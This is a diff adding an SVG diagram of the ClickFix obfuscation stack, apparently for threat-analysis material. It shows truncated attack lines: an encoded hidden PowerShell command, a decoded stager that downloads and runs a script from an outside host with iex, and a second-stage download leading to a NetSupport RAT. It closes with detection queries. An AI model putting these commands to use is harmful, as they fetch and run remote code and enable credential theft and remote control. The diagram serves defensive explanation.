@@ -1,0 +1,71 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 440" width="100%" style="max-width: 800px; height: auto;" role="img" aria-label="ClickFix obfuscation stack — how an attacker hides a malicious command behind layered encoding so the victim sees gibberish but the shell decodes it on paste">
+  <style>
+    .layer-a   { fill: #533483; fill-opacity: 0.12; stroke: #533483; stroke-width: 1.5; rx: 8; }
+    .layer-b   { fill: #0f3460; fill-opacity: 0.14; stroke: #0f3460; stroke-width: 1.5; rx: 8; }
+    .layer-c   { fill: #fb923c; fill-opacity: 0.16; stroke: #fb923c; stroke-width: 1.5; rx: 8; }
+    .layer-d   { fill: #e94560; fill-opacity: 0.18; stroke: #e94560; stroke-width: 1.8; rx: 8; }
+    .terminal  { fill: #16213e; fill-opacity: 0.35; stroke: currentColor; stroke-opacity: 0.4; stroke-width: 1.5; rx: 8; }
+    .title     { font: 600 16px ui-sans-serif, system-ui, sans-serif; fill: currentColor; }
+    .subtitle  { font: 12px ui-sans-serif, system-ui, sans-serif; fill: currentColor; fill-opacity: 0.6; }
+    .layer-lbl { font: 600 12.5px ui-sans-serif, system-ui, sans-serif; fill: currentColor; }
+    .pill      { font: 600 10px ui-sans-serif, system-ui, sans-serif; fill: currentColor; fill-opacity: 0.55; text-transform: uppercase; letter-spacing: 0.06em; }
+    .mono      { font: 11.5px ui-monospace, SFMono-Regular, Menlo, monospace; fill: currentColor; }
+    .mono-fade { font: 11.5px ui-monospace, SFMono-Regular, Menlo, monospace; fill: currentColor; fill-opacity: 0.55; }
+    .term-text { font: 11.5px ui-monospace, SFMono-Regular, Menlo, monospace; fill: #d1fae5; }
+    .term-prompt { font: 11.5px ui-monospace, SFMono-Regular, Menlo, monospace; fill: #fb923c; }
+    .arrow     { stroke: currentColor; stroke-opacity: 0.4; stroke-width: 1.5; fill: none; }
+    .annot     { font: 11px ui-sans-serif, system-ui, sans-serif; fill: currentColor; fill-opacity: 0.7; }
+  </style>
+
+  <text x="20" y="28" class="title">Obfuscation stack — what the victim sees vs. what runs</text>
+  <text x="20" y="50" class="subtitle">Most ClickFix payloads stack three to four encoding layers. The visible command is gibberish; PowerShell or zsh decodes the layers in sequence at runtime.</text>
+
+  <defs>
+    <marker id="downarr" viewBox="0 0 10 10" refX="5" refY="9" markerWidth="6" markerHeight="6" orient="auto">
+      <path d="M 0 0 L 5 9 L 10 0 z" fill="currentColor" fill-opacity="0.4"/>
+    </marker>
+  </defs>
+
+  <!-- Layer 1: Visible string -->
+  <rect class="layer-a" x="20" y="74" width="500" height="58"/>
+  <text x="36" y="94" class="pill">Layer 1 — what the victim pastes</text>
+  <text x="36" y="118" class="mono">powershell -nop -w hidden -enc JABzAGUAcgB2AGUAcgA9ACcAaAB0AHQAcAA6AC8ALwBu...</text>
+  <text x="540" y="103" class="layer-lbl">Visible</text>
+  <text x="540" y="121" class="annot">Looks like gibberish.</text>
+  <text x="540" y="135" class="annot">PowerShell flag tips off some EDR.</text>
+
+  <path class="arrow" d="M 270 138 L 270 154" marker-end="url(#downarr)"/>
+
+  <!-- Layer 2: Base64 decoded -->
+  <rect class="layer-b" x="20" y="156" width="500" height="58"/>
+  <text x="36" y="176" class="pill">Layer 2 — after -enc base64 decode</text>
+  <text x="36" y="200" class="mono">$server='http://nobovcs.com/bibi.php'; iex ((New-Object Net.WebClient).Down...</text>
+  <text x="540" y="185" class="layer-lbl">Decoded</text>
+  <text x="540" y="203" class="annot">Now PowerShell can see it.</text>
+  <text x="540" y="217" class="annot">iex + DownloadString = stager.</text>
+
+  <path class="arrow" d="M 270 220 L 270 236" marker-end="url(#downarr)"/>
+
+  <!-- Layer 3: Downloaded stager -->
+  <rect class="layer-c" x="20" y="238" width="500" height="58"/>
+  <text x="36" y="258" class="pill">Layer 3 — second-stage script fetched at runtime</text>
+  <text x="36" y="282" class="mono">function Install-RAT { Invoke-WebRequest 'http://...' -OutFile $env:TEMP\sup...</text>
+  <text x="540" y="267" class="layer-lbl">Stager</text>
+  <text x="540" y="285" class="annot">Lives only in memory.</text>
+  <text x="540" y="299" class="annot">Few on-disk artefacts.</text>
+
+  <path class="arrow" d="M 270 302 L 270 318" marker-end="url(#downarr)"/>
+
+  <!-- Layer 4: Final payload -->
+  <rect class="layer-d" x="20" y="320" width="500" height="58"/>
+  <text x="36" y="340" class="pill">Layer 4 — payload</text>
+  <text x="36" y="364" class="mono">NetSupport RAT installed under %LOCALAPPDATA%\&lt;random-folder&gt;\client32.exe</text>
+  <text x="540" y="349" class="layer-lbl">Outcome</text>
+  <text x="540" y="367" class="annot">Cred theft, persistence,</text>
+  <text x="540" y="381" class="annot">remote control.</text>
+
+  <!-- Detection callout terminal -->
+  <rect class="terminal" x="20" y="396" width="760" height="34"/>
+  <text x="36" y="418" class="term-prompt">DETECTION  </text>
+  <text x="126" y="418" class="term-text">Catch layer 1 with powershell_events cosine_similarity &lt; 0.25 (anomaly). Catch layer 2 string content with windows_events 4104 + script_text LIKE patterns.</text>
+</svg>
